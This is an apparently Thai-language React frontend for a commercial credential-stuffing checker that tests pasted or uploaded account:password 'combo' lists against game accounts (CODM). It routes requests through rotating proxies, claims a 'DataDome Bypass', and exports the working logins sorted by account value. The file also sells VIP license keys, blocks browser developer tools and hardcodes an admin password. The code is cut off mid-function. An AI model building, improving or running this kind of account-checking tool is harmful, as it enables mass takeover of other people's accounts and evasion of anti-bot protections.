import { BrowserRouter, Routes, Route, useNavigate, useLocation } from 'react-router-dom';
import React, { useState, useRef, useEffect } from 'react';
import { 
  Gamepad2, ListChecks, Play, Square, Check, X, Shield, Terminal, CheckCircle2, 
  Home, ShoppingCart, CreditCard, Phone, Upload, Key, Crown, LogOut, User, Gift, 
  FileImage, Database, Globe, BarChart3, Settings, Activity, FileText, 
  AlertTriangle, Download, ChevronRight, Trash2, ShieldAlert, Plus, Ban, History, Search, Copy 
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import Swal from 'sweetalert2';
import axios from 'axios';
import jsQR from 'jsqr';
import { supabase } from './lib/supabase';
import { User as SupabaseUser } from '@supabase/supabase-js';
import { Turnstile } from '@marsidev/react-turnstile';

interface AccountResult {
  account: string;
  password: string;
  uid: string;
  shells: number;
  cleanAt: string;
  level: number;
  rank: string;
  skins: number;
  isClean: boolean;
  hasCodm: boolean;
  phoneBound: boolean;
  emailVerified: boolean;
  fbLinked: boolean;
  region: string;
  otherGames: string[];
}

interface LogEntry {
  id: string;
  time: string;
  text: string;
  iconName: string;
  colorClass: string;
}

interface UserPlan {
  username: string;
  isPremium: boolean;
  premiumExpireDate: string | null;
}

var TextPaint = `▒▄▀▄▒█▀▄▒██▀░▀▄▀
2
░█▀█░█▀▒░█▄▄░█▒█`;

function AppContent() {
  const [combo, setCombo] = useState('');
  const comboRef = useRef('');
  const [running, setRunning] = useState(false);
  const runningRef = useRef(false);
  const [validAccounts, setValidAccounts] = useState<AccountResult[]>([]);
  const [invalidCount, setInvalidCount] = useState(0);
  const [totalChecked, setTotalChecked] = useState(0);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const logDivRef = useRef<HTMLDivElement>(null);

  const [startTime, setStartTime] = useState<number | null>(null);
  const [elapsedTime, setElapsedTime] = useState('00:00:00.000');
  const timerRef = useRef<any>(null);
  
  const [showPrivacy, setShowPrivacy] = useState(false);
  const [showTerms, setShowTerms] = useState(false);
  const [clientIp, setClientIp] = useState<string | null>(null);
  const [isLoaded, setIsLoaded] = useState(false);

  const [logoClicks, setLogoClicks] = useState(0);
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);
  const [adminUsername, setAdminUsername] = useState('');
  const [adminPassword, setAdminPassword] = useState('');

  // Supabase Auth State
  const [user, setUser] = useState<SupabaseUser | null>(null);
  const [showAuthModal, setShowAuthModal] = useState(false);
  const [authEmail, setAuthEmail] = useState('');
  const [authUsername, setAuthUsername] = useState('');
  const [authPassword, setAuthPassword] = useState('');
  const [authConfirmPassword, setAuthConfirmPassword] = useState('');
  const [authMode, setAuthMode] = useState<'login' | 'signup'>('login');
  const [authLoading, setAuthLoading] = useState(false);
  const [turnstileToken, setTurnstileToken] = useState<string | null>(null);
  const [checkTurnstileToken, setCheckTurnstileToken] = useState<string | null>(null);
  const [showCheckCaptchaModal, setShowCheckCaptchaModal] = useState(false);
  const [savedLinesToCheck, setSavedLinesToCheck] = useState<string[]>([]);
  const TURNSTILE_SITE_KEY = import.meta.env.VITE_TURNSTILE_SITE_KEY || '0x4AAAAAADDdDO8JWWr7qfc';

  enum OperationType {
    CREATE = 'create',
    UPDATE = 'update',
    DELETE = 'delete',
    LIST = 'list',
    GET = 'get',
    WRITE = 'write',
    AUTH = 'auth'
  }

  function handleDbError(error: unknown, operationType: OperationType, path: string | null) {
    const errInfo = {
      error: error instanceof Error ? error.message : String(error),
      authInfo: {
        userId: (window as any)._user?.id,
      },
      operationType,
      path
    };
    console.error('Database Error: ', JSON.stringify(errInfo));
  }

  const [userPlan, setUserPlan] = useState<UserPlan | null>(null);
  const [dailyUsage, setDailyUsage] = useState<number>(0);
  const [lastUsageDate, setLastUsageDate] = useState<string>('');
  const [showKeyModal, setShowKeyModal] = useState(false);
  const [vipTab, setVipTab] = useState<'key'>('key');

  const [proxy, setProxy] = useState<string>('');

  // Firebase State
  const [firebaseKeys, setFirebaseKeys] = useState<any[]>([]);
  const [usedKeysHistory, setUsedKeysHistory] = useState<any[]>([]);
  const [blockedIPs, setBlockedIPs] = useState<any[]>([]);
  const [adminTab, setAdminTab] = useState<'overview' | 'keys' | 'history' | 'ips'>('overview');
  const [isIPBlocked, setIsIPBlocked] = useState(false);

  const [isDBReady, setIsDBReady] = useState(true);
  const [dbErrorDetail, setDbErrorDetail] = useState<string | null>(null);

  // Supabase Auth Listener
  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      setUser(session?.user ?? null);
      if (session?.user) {
        // If logged in, fetch their specific user data if needed
      }
    });

    const { data: authListener } = supabase.auth.onAuthStateChange(
      (event, session) => {
        setUser(session?.user ?? null);
        if (session?.user) {
          // If logged in, fetch their specific user data if needed
        }
      }
    );

    return () => {
      authListener.subscription.unsubscribe();
    };
  }, []);

  // Backend API Listeners
  useEffect(() => {
    let isMounted = true;
    const pollInterval = 5000;

    const fetchAllData = async () => {
      try {
        console.log("Starting data fetch from backend...");
        
        const fetchWithCatch = async (url: string) => {
          try {
            const res = await axios.get(url);
            return res.data;
          } catch (e: any) {
            console.error(`Fetch ERROR for ${url}:`, {
              message: e.message,
              code: e.code,
              status: e.response?.status,
              data: e.response?.data
            });
            return null;
          }
        };

        const [healthData, keysData, historyData, ipsData] = await Promise.all([
          fetchWithCatch('/api/health'),
          fetchWithCatch('/api/license_keys'),
          fetchWithCatch('/api/used_keys'),
          fetchWithCatch('/api/blocked_ips')
        ]);

        console.log("Fetch results:", { 
          health: !!healthData, 
          keys: !!keysData, 
          history: !!historyData, 
          ips: !!ipsData 
        });

        if (isMounted) {
          if (keysData) setFirebaseKeys(keysData);
          if (historyData) setUsedKeysHistory(historyData);
          if (ipsData) setBlockedIPs(ipsData);
          
          if (keysData || historyData || ipsData) {
            setIsDBReady(true);
            setDbErrorDetail(null);
          } else if (!healthData) {
            setIsDBReady(false);
            setDbErrorDetail("Cannot connect to backend server. Please try refreshing.");
          }
        }
      } catch (err: any) {
        if (isMounted) {
          console.error("Critical fetch error:", err);
        }
      }
    };

    fetchAllData();
    const timer = setInterval(fetchAllData, pollInterval);

    return () => {
      isMounted = false;
      clearInterval(timer);
    };
  }, []);

  // Check if current IP is blocked (from backend)
  useEffect(() => {
    if (!clientIp) return;
    const checkIP = async () => {
      try {
        const res = await axios.get(`/api/check_ip/${clientIp}`);
        if (res.data.blocked) {
          setIsIPBlocked(true);
        }
      } catch (err) {
        console.error("Error checking IP status:", err);
      }
    };
    checkIP();
  }, [clientIp]);

  // Load Data by IP
  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        setClientIp(ip);
        
        const savedCombo = localStorage.getItem(`checker_combo_${ip}`);
        const savedValid = localStorage.getItem(`checker_valid_${ip}`);
        const savedInvalid = localStorage.getItem(`checker_invalid_${ip}`);
        const savedTotal = localStorage.getItem(`checker_total_${ip}`);
        const savedLogs = localStorage.getItem(`checker_logs_${ip}`);
        const savedUserPlan = localStorage.getItem(`checker_userplan_${ip}`);
        const savedDailyUsage = localStorage.getItem(`checker_usage_${ip}`);
        const savedLastDate = localStorage.getItem(`checker_lastdate_${ip}`);

        const todayDate = new Date().toISOString().slice(0, 10);
        if (savedLastDate === todayDate) {
          setDailyUsage(Number(savedDailyUsage) || 0);
        } else {
          setDailyUsage(0);
        }
        setLastUsageDate(todayDate);

        if (savedUserPlan) setUserPlan(JSON.parse(savedUserPlan));

        if (savedCombo) setCombo(savedCombo);
        if (savedValid) setValidAccounts(JSON.parse(savedValid));
        if (savedInvalid) setInvalidCount(Number(savedInvalid));
        if (savedTotal) setTotalChecked(Number(savedTotal));
        
        if (savedLogs && JSON.parse(savedLogs).length > 0) {
          setLogs(JSON.parse(savedLogs));
        } else {
          console.log(TextPaint);
          setLogs([{
            id: Math.random().toString(36).substring(2, 9),
            time: new Date().toLocaleTimeString('th-TH'),
            text: TextPaint,
            iconName: 'terminal',
            colorClass: 'text-cyan-400'
          }, {
            id: Math.random().toString(36).substring(2, 9),
            time: new Date().toLocaleTimeString('th-TH'),
            text: 'ระบบพร้อมใช้งาน • นโยบายความเป็นส่วนตัวเวอร์ชันละเอียด',
            iconName: 'shield',
            colorClass: 'text-cyan-400'
          }]);
        }
        setIsLoaded(true);
      })
      .catch(() => {
        setClientIp('offline_local');
        console.log(TextPaint);
        setLogs([{
            id: Math.random().toString(36).substring(2, 9),
            time: new Date().toLocaleTimeString('th-TH'),
            text: TextPaint,
            iconName: 'terminal',
            colorClass: 'text-cyan-400'
        }, {
            id: Math.random().toString(36).substring(2, 9),
            time: new Date().toLocaleTimeString('th-TH'),
            text: 'ระบบพร้อมใช้งาน (ออฟไลน์) • นโยบายความเป็นส่วนตัว',
            iconName: 'shield',
            colorClass: 'text-cyan-400'
        }]);
        setIsLoaded(true);
      });
  }, []);

  // Sync combo to ref for high-speed access
  useEffect(() => {
    comboRef.current = combo;
  }, [combo]);

  const updateElapsedTime = () => {
    if (!startTime) return;
    const now = performance.now();
    const diff = now - startTime;
    const hours = Math.floor(diff / 3600000).toString().padStart(2, '0');
    const minutes = Math.floor((diff % 3600000) / 60000).toString().padStart(2, '0');
    const seconds = Math.floor((diff % 60000) / 1000).toString().padStart(2, '0');
    const ms = Math.floor(diff % 1000).toString().padStart(3, '0');
    setElapsedTime(`${hours}:${minutes}:${seconds}.${ms}`);
  };

  useEffect(() => {
    if (running) {
      setStartTime(performance.now());
      timerRef.current = setInterval(updateElapsedTime, 67); // ~15fps update for performance
    } else {
      if (timerRef.current) clearInterval(timerRef.current);
    }
    return () => { if (timerRef.current) clearInterval(timerRef.current); };
  }, [running]);

  // Save Data by IP
  useEffect(() => {
    if (!isLoaded || !clientIp) return;
    localStorage.setItem(`checker_combo_${clientIp}`, combo);
  }, [combo, isLoaded, clientIp]);

  useEffect(() => {
    if (!isLoaded || !clientIp) return;
    localStorage.setItem(`checker_valid_${clientIp}`, JSON.stringify(validAccounts));
  }, [validAccounts, isLoaded, clientIp]);

  useEffect(() => {
    if (!isLoaded || !clientIp) return;
    localStorage.setItem(`checker_invalid_${clientIp}`, invalidCount.toString());
    localStorage.setItem(`checker_total_${clientIp}`, totalChecked.toString());
  }, [invalidCount, totalChecked, isLoaded, clientIp]);

  useEffect(() => {
    if (!isLoaded || !clientIp) return;
    localStorage.setItem(`checker_logs_${clientIp}`, JSON.stringify(logs.slice(-100))); // Keep last 100
  }, [logs, isLoaded, clientIp]);

  useEffect(() => {
    if (!isLoaded || !clientIp) return;
    localStorage.setItem(`checker_usage_${clientIp}`, dailyUsage.toString());
  }, [dailyUsage, isLoaded, clientIp]);

  useEffect(() => {
    if (!isLoaded || !clientIp) return;
    localStorage.setItem(`checker_lastdate_${clientIp}`, lastUsageDate);
  }, [lastUsageDate, isLoaded, clientIp]);

  useEffect(() => {
    if (!isLoaded || !clientIp) return;
    if (userPlan) {
      localStorage.setItem(`checker_userplan_${clientIp}`, JSON.stringify(userPlan));
    } else {
      localStorage.removeItem(`checker_userplan_${clientIp}`);
    }
  }, [userPlan, isLoaded, clientIp]);

  // Anti-Hack
  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    const handleKeyDown = (e: KeyboardEvent) => {
      if (
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && ['I', 'C', 'J'].includes(e.key.toUpperCase())) ||
        (e.ctrlKey && e.key.toLowerCase() === 'u')
      ) {
        e.preventDefault();
        Swal.fire({
          title: '🚫 ถูกบล็อก',
          text: 'ไม่อนุญาตให้เปิด Developer Tools',
          icon: 'error',
        });
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('keydown', handleKeyDown);

    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, []);

  // Auto-scroll logs
  useEffect(() => {
    if (logDivRef.current) {
      logDivRef.current.scrollTop = logDivRef.current.scrollHeight;
    }
  }, [logs]);

  const addLog = (text: string, iconName: string, colorClass: string = 'text-gray-300') => {
    setLogs(prev => [
      ...prev,
      {
        id: Math.random().toString(36).substring(2, 9),
        time: new Date().toLocaleTimeString('th-TH'),
        text,
        iconName,
        colorClass,
      }
    ]);
  };

  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  const redeemKey = async (keyInput: string) => {
    if (!keyInput) return;
    try {
      Swal.fire({
        title: 'กำลังตรวจสอบ...',
        allowOutsideClick: false,
        didOpen: () => {
          Swal.showLoading();
        },
        background: '#09090b',
        color: '#fff'
      });

      const keyResponse = await axios.get(`/api/validate_key/${keyInput.trim()}`);
      const keyData = keyResponse.data;

      if (keyData && keyData.status === 'active') {
        // 1. Mark key as used in backend
        await axios.patch(`/api/license_keys/${keyData.id}`, { status: 'used' });

        // 2. Add to history in backend
        await axios.post(`/api/used_keys`, {
          key: keyInput,
          ip: clientIp || 'Unknown',
          details: `Redeemed ${keyData.type} plan`
        });

        // 3. Update User Plan locally
        let days = 1;
        if (keyData.type === 'Week') days = 7;
        if (keyData.type === 'Month') days = 30;
        if (keyData.type === '3Month') days = 90;
        if (keyData.type === 'Year') days = 365;
        if (keyData.type === 'Lifetime') days = 9999;
        
        const expireDate = new Date();
        expireDate.setDate(expireDate.getDate() + days);
        const newPlan = { username: 'VIP Member', isPremium: true, premiumExpireDate: expireDate.toISOString() };
        setUserPlan(newPlan);
        localStorage.setItem(`checker_userplan_${clientIp}`, JSON.stringify(newPlan));

        Swal.fire({
          icon: 'success',
          title: 'ยินดีด้วย!',
          text: `คุณได้รับสิทธิ์ระดับ ${keyData.type} เรียบร้อยแล้ว`,
          background: '#09090b',
          color: '#fff'
        });
      } else {
        Swal.fire({
          icon: 'error',
          title: 'กุญแจถูกใช้งานแล้ว',
          text: 'รหัสที่คุณกรอกถูกใช้งานไปก่อนหน้านี้แล้ว',
          background: '#09090b',
          color: '#fff'
        });
      }
    } catch (err: any) {
      if (err.response && err.response.status === 404) {
        Swal.fire({
          icon: 'error',
          title: 'ไม่พบกุญแจนี้',
          text: 'รหัสที่คุณกรอกอาจจะผิด หรือถูกใช้งานไปแล้ว',
          background: '#09090b',
          color: '#fff'
        });
      } else {
        handleDbError(err, OperationType.WRITE, 'license_keys');
        Swal.fire('Error', 'การสื่อสารล้มเหลว: ' + (err.message || 'Unknown error'), 'error');
      }
    }
  };
  const handleLogoClick = () => {
    const nextClicks = logoClicks + 1;
    if (nextClicks >= 5) {
      setLogoClicks(0);
      setShowAdminLogin(true);
    } else {
      setLogoClicks(nextClicks);
      // Reset clicks after 2 seconds of inactivity
      setTimeout(() => setLogoClicks(0), 2000);
    }
  };

  const handleAdminLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (adminUsername === 'admin_apex' && adminPassword === '123456!?/asqi') {
      try {
        // Automatically sign in the admin to Firebase as well if needed
        // but for now we just keep the existing logic
        setIsAdmin(true);
        setShowAdminLogin(false);
        Swal.fire({
          icon: 'success',
          title: 'ยินดีต้อนรับทีมพัฒนา',
          text: 'เข้าสู่ระบบหลังบ้าน Apex Backend สำเร็จ',
          timer: 1500,
          showConfirmButton: false,
          background: '#09090b',
          color: '#fff'
        });
      } catch (err) {
        console.error("Supabase Admin Error:", err);
        setIsAdmin(true); 
        setShowAdminLogin(false);
      }
    } else {
      Swal.fire({
        icon: 'error',
        title: 'สิทธิ์การเข้าถึงถูกปฏิเสธ',
        text: 'ชื่อผู้ใช้หรือรหัสผ่านไม่ถูกต้อง',
        background: '#09090b',
        color: '#fff'
      });
    }
  };

  const handleAuth = async (e: React.FormEvent) => {
    e.preventDefault();
    if (authMode === 'signup' && authPassword !== authConfirmPassword) {
      Swal.fire({
        icon: 'error',
        title: 'ข้อผิดพลาด',
        text: 'รหัสผ่านและยืนยันรหัสผ่านไม่ตรงกัน',
        background: '#09090b',
        color: '#fff'
      });
      return;
    }
    setAuthLoading(true);
    try {
      if (!turnstileToken) {
        throw new Error('กรุณายืนยันว่าคุณไม่ใช่บอท');
      }

      // Verify Turnstile locally via backend
      const verifyRes = await axios.post('/api/verify_turnstile', {
        token: turnstileToken
      });

      if (!verifyRes.data.success) {
        throw new Error('การยืนยัน Captcha ล้มเหลว');
      }

      if (authMode === 'signup') {
        const { data, error } = await supabase.auth.signUp({
          email: authEmail,
          password: authPassword,
          options: {
            data: { username: authUsername }
          }
        });
        
        if (error) throw error;
        
        Swal.fire({
          icon: 'success',
          title: 'สร้างบัญชีสำเร็จ!',
          text: 'กรุณาตรวจสอบอีเมลของคุณเพื่อยืนยันบัญชี (เช็คใน Junk/Spam ด้วย)',
          background: '#09090b',
          color: '#fff'
        });
        setAuthMode('login');
      } else {
        const { data, error } = await supabase.auth.signInWithPassword({
          email: authEmail,
          password: authPassword,
        });

        if (error) throw error;

        Swal.fire({
          icon: 'success',
          title: 'เข้าสู่ระบบสำเร็จ',
          timer: 1500,
          showConfirmButton: false,
          background: '#09090b',
          color: '#fff'
        });
        setShowAuthModal(false);
      }
    } catch (err: any) {
      console.error("Auth Error:", err);
      let msg = err.message;
      if (err.message.includes('already registered')) msg = 'อีเมลนี้ถูกใช้งานแล้ว';
      if (err.message.includes('Invalid login credentials')) msg = 'อีเมลหรือรหัสผ่านไม่ถูกต้อง';
      if (err.message.includes('invalid email format')) msg = 'รูปแบบอีเมลไม่ถูกต้อง';
      
      Swal.fire({
        icon: 'error',
        title: 'ข้อผิดพลาด',
        text: msg,
        background: '#09090b',
        color: '#fff'
      });
    } finally {
      setAuthLoading(false);
    }
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    setUserPlan(null);
    Swal.fire({
      icon: 'info',
      title: 'ออกจากระบบแล้ว',
      timer: 1500,
      showConfirmButton: false,
      background: '#09090b',
      color: '#fff'
    });
  };

  const resendVerification = async () => {
    if (user && !user.email_confirmed_at && user.email) {
      try {
        const { error } = await supabase.auth.resend({
          type: 'signup',
          email: user.email,
        });
        if (error) throw error;
        
        Swal.fire({
          icon: 'success',
          title: 'ส่งอีเมลอีกครั้งแล้ว',
          text: 'โปรดตรวจสอบกล่องข้อความของคุณ',
          background: '#09090b',
          color: '#fff'
        });
      } catch (err: any) {
        Swal.fire('Error', err.message, 'error');
      }
    }
  };

  const addLicenseKey = async () => {
    const { value: formValues } = await Swal.fire({
      title: 'สร้างคีย์ใหม่',
      html:
        '<select id="swal-input1" class="swal2-input bg-zinc-900 border-white/10 text-white w-full">' +
        '<option value="Day">1 วัน (Day)</option>' +
        '<option value="Week">7 วัน (Week)</option>' +
        '<option value="Month">1 เดือน (Month)</option>' +
        '<option value="3Month">3 เดือน (3 Months)</option>' +
        '<option value="Year">1 ปี (Year)</option>' +
        '<option value="Lifetime">ถาวร (Lifetime)</option>' +
        '</select>' +
        '<input id="swal-input2" class="swal2-input bg-zinc-900 border-white/10 text-white w-full" placeholder="จำนวนคีย์ (1-50)" type="number" value="1">',
      focusConfirm: false,
      background: '#09090b',
      color: '#fff',
      preConfirm: () => {
        return [
          (document.getElementById('swal-input1') as HTMLSelectElement).value,
          (document.getElementById('swal-input2') as HTMLInputElement).value
        ]
      }
    });

    if (formValues) {
      const [type, countStr] = formValues;
      const count = parseInt(countStr) || 1;
      
      try {
        const newKeys = [];
        for (let i = 0; i < count; i++) {
          const newKey = 'APEX-' + Math.random().toString(36).substring(2, 10).toUpperCase() + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
          newKeys.push({
            key: newKey,
            plan: type,
            status: 'active',
            created_at: new Date().toISOString()
          });
        }
        await axios.post(`/api/license_keys/bulk`, { keys: newKeys });
        Swal.fire('สำเร็จ', `สร้างคีย์ ${count} รายการ สำเร็จ`, 'success');
      } catch (err) {
        handleDbError(err, OperationType.WRITE, 'license_keys');
        Swal.fire('Error', 'ไม่สามารถสร้างคีย์ได้: ' + (err as Error).message, 'error');
      }
    }
  };

  const blockIP = async () => {
    const { value: ipData } = await Swal.fire({
      title: 'บล็อค IP ผู้ใช้',
      html:
        '<input id="swal-ip" class="swal2-input bg-zinc-900 border-white/10 text-white w-full" placeholder="IP Address เช่น 1.1.1.1">' +
        '<input id="swal-reason" class="swal2-input bg-zinc-900 border-white/10 text-white w-full" placeholder="เหตุผลการบล็อค">',
      focusConfirm: false,
      background: '#09090b',
      color: '#fff',
      preConfirm: () => {
        return [
          (document.getElementById('swal-ip') as HTMLInputElement).value,
          (document.getElementById('swal-reason') as HTMLInputElement).value
        ]
      }
    });

    if (ipData) {
      const [ip, reason] = ipData;
      if (!ip) return;
      try {
        await axios.post(`/api/blocked_ips`, {
          ip,
          reason: reason || 'Violation of terms'
        });
        Swal.fire('สำเร็จ', `บล็อค IP ${ip} สำเร็จ`, 'success');
      } catch (err) {
        handleDbError(err, OperationType.WRITE, 'blocked_ips');
        Swal.fire('Error', 'ไม่สามารถบล็อคได้: ' + (err as Error).message, 'error');
      }
    }
  };

  const deleteKey = async (keyId: string) => {
    const result = await Swal.fire({
      title: 'ยืนยันการลบ?',
      text: "คุณกำลังลบคีย์ " + keyId,
      icon: 'warning',
      showCancelButton: true,
      confirmButtonColor: '#ef4444',
      cancelButtonColor: '#27272a',
      confirmButtonText: 'ลบออก',
      background: '#09090b',
      color: '#fff'
    });

    if (result.isConfirmed) {
      try {
        await axios.delete(`/api/license_keys/${keyId}`);
        Swal.fire('ลบแล้ว', 'คีย์ถูกลบออกจากระบบแล้ว', 'success');
        setFirebaseKeys(prev => prev.filter(k => k.id !== keyId));
      } catch (err) {
        handleDbError(err, OperationType.DELETE, 'license_keys/' + keyId);
        Swal.fire('Error', 'ลบไม่สำเร็จ: ' + (err as Error).message, 'error');
      }
    }
  };

  const unblockIP = async (ip: string) => {
    try {
      await axios.delete(`/api/blocked_ips/${ip}`);
      Swal.fire('สำเร็จ', 'ปลดบล็อค IP เรียบร้อย', 'success');
      setBlockedIPs(prev => prev.filter(i => i.ip !== ip));
    } catch (err) {
      handleDbError(err, OperationType.DELETE, 'blocked_ips/' + ip);
      Swal.fire('Error', 'ไม่สำเร็จ: ' + (err as Error).message, 'error');
    }
  };

  const getFormattedProxy = () => {
    if (!proxy || !proxy.trim()) return undefined;
    const proxyList = proxy.split('\n').map(p => p.trim()).filter(p => p);
    if (proxyList.length === 0) return undefined;
    const selected = proxyList[Math.floor(Math.random() * proxyList.length)];
    
    // IP:PORT@USER:PASS
    if (selected.includes('@') && !selected.startsWith('http')) {
       const [ipPort, userPass] = selected.split('@');
       return `http://${userPass}@${ipPort}`;
    }
    // IP:PORT:USER:PASS
    const parts = selected.split(':');
    if (parts.length === 4 && !selected.startsWith('http')) {
        return `http://${parts[2]}:${parts[3]}@${parts[0]}:${parts[1]}`;
    }
    if (!selected.startsWith('http')) {
        return `http://${selected}`;
    }
    return selected;
  };

  const checkSingle = async (acc: string, pass: string, index: number, cToken?: string | null) => {
    try {
      setTotalChecked(prev => prev + 1);
      addLog(`[${index+1}] กำลังทำ DataDome Bypass...`, 'shield', 'text-amber-400');
      
      const activeProxy = getFormattedProxy();
      const response = await axios.post(`/api/check`, { 
        account: acc, 
        password: pass,
        proxy: activeProxy, // Send the formatted proxy to backend
        turnstileToken: cToken || checkTurnstileToken
      });
      const result = response.data;

      if (result.success) {
        addLog(`[${index+1}] SSO Authenticated! กำลังดึงข้อมูลเกม...`, 'key', 'text-cyan-400');
        const newResult: AccountResult = {
          ...result.data,
          cleanAt: new Date().toLocaleDateString('th-TH'),
          skins: result.data.skins || 0
        };
        
        setValidAccounts(prev => [newResult, ...prev]);
        addLog(`[${index+1}] สำเร็จ: ${acc} [UID: ${newResult.uid} | CODM Level: ${newResult.level}]`, 'check-circle', 'text-green-400 font-bold');
      } else {
        setInvalidCount(prev => prev + 1);
        addLog(`[${index+1}] ไม่ผ่าน: ${acc} (${result.error || 'Check failed'})`, 'x', 'text-red-400');
      }
    } catch (err: any) {
      setInvalidCount(prev => prev + 1);
      addLog(`[${index+1}] ระบบขัดข้อง: ${acc} (Check logs)`, 'x', 'text-red-500 font-bold');
    }
  };

  const startCheck = async () => {
    if (running) return;
    const text = comboRef.current;
    if (!text.trim()) {
      Swal.fire({ title: 'ข้อผิดพลาด', text: 'ไม่มี Combo', icon: 'error' });
      return;
    }

    const lines = text.trim().split('\n').map(l => l.trim()).filter(l => l.includes(':'));
    if (lines.length === 0) {
      Swal.fire({ title: 'ข้อผิดพลาด', text: 'รูปแบบข้อมูลไม่ถูกต้อง (ต้องมี : )', icon: 'error' });
      return;
    }

    if (!user) {
      Swal.fire({ 
        title: 'ต้องเข้าสู่ระบบ', 
        text: 'กรุณาเข้าสู่ระบบก่อนเริ่มการทำงาน', 
        icon: 'warning',
        showCancelButton: true,
        confirmButtonText: 'เข้าสู่ระบบ'
      }).then((res) => {
        if (res.isConfirmed) setShowAuthModal(true);
      });
      return;
    }

    if (!user.email_confirmed_at) {
      Swal.fire({ 
        title: 'ยังไม่ยืนยันอีเมล', 
        text: 'กรุณายืนยันอีเมลของคุณก่อนเริ่มการทำงาน ทีมงานส่งลิงก์ไปให้ทางอีเมลแล้ว', 
        icon: 'error',
        showCancelButton: true,
        confirmButtonText: 'ส่งอีเมลยืนยันอีกครั้ง'
      }).then((res) => {
        if (res.isConfirmed) resendVerification();
      });
      return;
    }

    const MAX_DAILY = 1000;
    const isPremium = userPlan?.isPremium;
    let linesToCheck = lines;

    if (!isPremium) {
      const remaining = MAX_DAILY - dailyUsage;
      if (remaining <= 0) {
        Swal.fire({ title: 'โควต้าเต็ม', text: 'คุณใช้งานครบ 1000 บรรทัดสำหรับวันนี้แล้ว โปรดอัปเกรด VIP เพื่อใช้งานไม่จำกัด', icon: 'error' });
        return;
      }
      if (lines.length > remaining) {
        linesToCheck = lines.slice(0, remaining);
        Swal.fire({ 
          title: 'จำกัดจำนวน (ผู้ใช้ฟรี)', 
          text: `คุณตรวจสอบได้อีก ${remaining} บรรทัดในวันนี้ ระบบจะทำการตรวจสอบเพียง ${remaining} บรรทัดแรก`, 
          icon: 'warning'
        });
      }
    }

    setSavedLinesToCheck(linesToCheck);
    if (isPremium) {
      executeCheck('premium-bypass');
    } else {
      setCheckTurnstileToken(null);
      setShowCheckCaptchaModal(true);
    }
  };

  const executeCheck = async (token: string) => {
    setShowCheckCaptchaModal(false);
    setCheckTurnstileToken(token);

    setRunning(true);
    runningRef.current = true;
    setValidAccounts([]);
    setInvalidCount(0);
    setTotalChecked(0);
    setElapsedTime('00:00:00.000');
    
    addLog(`เริ่มตรวจสอบ... ทั้งหมด ${savedLinesToCheck.length} รายการ [DataDome Bypass: ACTIVE]`, 'terminal', 'text-cyan-400');

    for (let i = 0; i < savedLinesToCheck.length; i++) {
      if (!runningRef.current) break;
      const line = savedLinesToCheck[i];
      const [acc, pass] = line.split(':', 2);
      if (acc && pass) {
        await checkSingle(acc.trim(), pass.trim(), i, token);
        if (!userPlan?.isPremium) {
           setDailyUsage(prev => prev + 1);
        }
      }
      // Yield to UI to prevent hanging with 1M rows
      if (i % 25 === 0) await delay(0);
    }

    addLog('ตรวจสอบเสร็จสิ้น', 'check', 'text-green-400');
    setRunning(false);
    runningRef.current = false;
  };

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;

    if (!file.name.toLowerCase().endsWith('.txt')) {
      Swal.fire({
        title: 'ข้อผิดพลาด',
        text: 'รองรับเฉพาะไฟล์ .txt เท่านั้น',
        icon: 'error'
      });
      e.target.value = '';
      return;
    }

    const reader = new FileReader();
    reader.onload = (event) => {
      const text = event.target?.result as string;
      setCombo(prev => prev ? prev + '\n' + text : text);
      Swal.fire({
        title: 'สำเร็จ',
        text: 'นำเข้าข้อมูลจากไฟล์ .txt สำเร็จ',
        icon: 'success',
        timer: 1500,
        showConfirmButton: false
      });
    };
    reader.readAsText(file);
    e.target.value = '';
  };

  const stopCheck = () => {
    if (!running) return;
    setRunning(false);
    runningRef.current = false;
    addLog('⛔ หยุดตามคำสั่ง', 'square', 'text-orange-400');
  };

  const clearLog = () => {
    setLogs([]);
  };

  const downloadFile = (name: string, content: string) => {
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = name;
    a.click();
    URL.revokeObjectURL(url);
  };

  const exportClean = () => {
    const data = validAccounts.filter(a => a.isClean);
    if (!data.length) return Swal.fire({ title: 'ข้อมูล', text: 'ไม่พบบัญชีปกติ (Clean)', icon: 'info' });
    downloadFile(`Clean_Accounts_${new Date().toISOString().slice(0, 10)}.txt`, data.map(a => `${a.account}:${a.password}`).join('\n'));
    Swal.fire({ title: 'สำเร็จ', text: 'บันทึกไฟล์สำเร็จ', icon: 'success' });
  };

  const exportBound = () => {
    const data = validAccounts.filter(a => !a.isClean);
    if (!data.length) return Swal.fire({ title: 'ข้อมูล', text: 'ไม่พบบัญชีเชื่อมโยง (Bound)', icon: 'info' });
    downloadFile(`Bound_Accounts_${new Date().toISOString().slice(0, 10)}.txt`, data.map(a => `${a.account}:${a.password}`).join('\n'));
    Swal.fire({ title: 'สำเร็จ', text: 'บันทึกไฟล์สำเร็จ', icon: 'success' });
  };

  const exportAllValid = () => {
    if (!validAccounts.length) return Swal.fire({ title: 'คำเตือน', text: 'ไม่มีข้อมูลบัญชีที่ผ่าน', icon: 'warning' });
    const text = validAccounts.map(a => 
      `Account: ${a.account}:${a.password}\n` +
      `UID: ${a.uid} | Region: ${a.region} | Shells: ${a.shells}\n` +
      `Level: ${a.level} | Rank: ${a.rank} | Skins: ${a.skins}\n` +
      `Status: ${a.isClean ? 'Clean' : 'Bound'} | CODM: ${a.hasCodm ? 'Yes' : 'No'}\n` +
